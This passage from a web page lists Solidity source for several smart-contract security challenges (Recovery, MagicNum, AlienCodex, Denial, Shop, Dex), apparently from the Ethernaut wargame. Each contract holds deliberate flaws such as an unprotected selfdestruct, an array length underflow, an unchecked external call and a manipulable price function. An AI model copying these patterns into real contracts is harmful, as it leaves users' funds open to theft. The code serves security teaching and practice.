</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="recovery" tabindex="-1"><a class="header-anchor" href="#recovery" aria-hidden="true">#</a> Recovery</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Recovery</span> <span class="token punctuation">{</span>
    <span class="token comment">//generate tokens</span>
    <span class="token keyword">function</span> <span class="token function">generateToken</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _name<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">SimpleToken</span><span class="token punctuation">(</span>_name<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> _initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">SimpleToken</span> <span class="token punctuation">{</span>
    <span class="token builtin">string</span> <span class="token keyword">public</span> name<span class="token punctuation">;</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>

    <span class="token comment">// constructor</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _name<span class="token punctuation">,</span> <span class="token builtin">address</span> _creator<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        name <span class="token operator">=</span> _name<span class="token punctuation">;</span>
        balances<span class="token punctuation">[</span>_creator<span class="token punctuation">]</span> <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// collect ether in return for tokens</span>
    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// allow transfers of tokens</span>
    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _amount<span class="token punctuation">;</span>
        balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> _amount<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// clean up after ourselves</span>
    <span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="magicnum" tabindex="-1"><a class="header-anchor" href="#magicnum" aria-hidden="true">#</a> MagicNum</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">MagicNum</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> solver<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">setSolver</span><span class="token punctuation">(</span><span class="token builtin">address</span> _solver<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        solver <span class="token operator">=</span> _solver<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____        
     __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___       
      ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__      
       ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___     
        ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____    
         __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________   
          _\\///////////\\\\\\//____/\\\\\\/___________  
           ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ 
            ___________\\///_____\\///////////////__
    */</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="aliencodex" tabindex="-1"><a class="header-anchor" href="#aliencodex" aria-hidden="true">#</a> AlienCodex</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.5.0</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;../helpers/Ownable-05.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">AlienCodex</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">{</span>
    <span class="token builtin">bool</span> <span class="token keyword">public</span> contact<span class="token punctuation">;</span>
    <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">public</span> codex<span class="token punctuation">;</span>

    <span class="token keyword">modifier</span> <span class="token function">contacted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>contact<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">makeContact</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        contact <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">record</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _content<span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">{</span>
        codex<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>_content<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">retract</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">{</span>
        codex<span class="token punctuation">.</span>length<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">revise</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> i<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> _content<span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">{</span>
        codex<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _content<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="denial" tabindex="-1"><a class="header-anchor" href="#denial" aria-hidden="true">#</a> Denial</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Denial</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> partner<span class="token punctuation">;</span> <span class="token comment">// withdrawal partner - pay the gas, split the withdraw</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> owner <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0xA9E</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> timeLastWithdrawn<span class="token punctuation">;</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> withdrawPartnerBalances<span class="token punctuation">;</span> <span class="token comment">// keep track of partners balances</span>

    <span class="token keyword">function</span> <span class="token function">setWithdrawPartner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _partner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        partner <span class="token operator">=</span> _partner<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// withdraw 1% to recipient and 1% to owner</span>
    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint256</span> amountToSend <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>
        <span class="token comment">// perform a call without checking return</span>
        <span class="token comment">// The recipient can revert, the owner will still get their share</span>
        partner<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> amountToSend<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>amountToSend<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// keep track of last withdrawal time</span>
        timeLastWithdrawn <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>
        withdrawPartnerBalances<span class="token punctuation">[</span>partner<span class="token punctuation">]</span> <span class="token operator">+=</span> amountToSend<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// allow deposit of funds</span>
    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token comment">// convenience function</span>
    <span class="token keyword">function</span> <span class="token function">contractBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="shop" tabindex="-1"><a class="header-anchor" href="#shop" aria-hidden="true">#</a> Shop</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">Buyer</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Shop</span> <span class="token punctuation">{</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> price <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token builtin">bool</span> <span class="token keyword">public</span> isSold<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        Buyer _buyer <span class="token operator">=</span> <span class="token function">Buyer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>_buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> price <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isSold<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            isSold <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            price <span class="token operator">=</span> _buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="dex" tabindex="-1"><a class="header-anchor" href="#dex" aria-hidden="true">#</a> Dex</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Dex</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> token1<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> token2<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">setTokens</span><span class="token punctuation">(</span><span class="token builtin">address</span> _token1<span class="token punctuation">,</span> <span class="token builtin">address</span> _token2<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
        token1 <span class="token operator">=</span> _token1<span class="token punctuation">;</span>
        token2 <span class="token operator">=</span> _token2<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">addLiquidity</span><span class="token punctuation">(</span><span class="token builtin">address</span> token_address<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
        <span class="token function">IERC20</span><span class="token punctuation">(</span>token_address<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token1 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token2 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;Invalid tokens&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> amount<span class="token punctuation">,</span> <span class="token string">&quot;Not enough to swap&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint256</span> swapAmount <span class="token operator">=</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token function">SwappableToken</span><span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">SwappableToken</span><span class="token punctuation">(</span>token2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">SwappableToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">private</span> _dex<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> dexInstance<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> name<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol<span class="token punctuation">,</span> <span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span>
        <span class="token function">ERC20</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>
        _dex <span class="token operator">=</span> dexInstance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> _dex<span class="token punctuation">,</span> <span class="token string">&quot;InvalidApprover&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        super<span class="token punctuation">.</span><span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="dextwo" tabindex="-1"><a class="header-anchor" href="#dextwo" aria-hidden="true">#</a> DexTwo</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

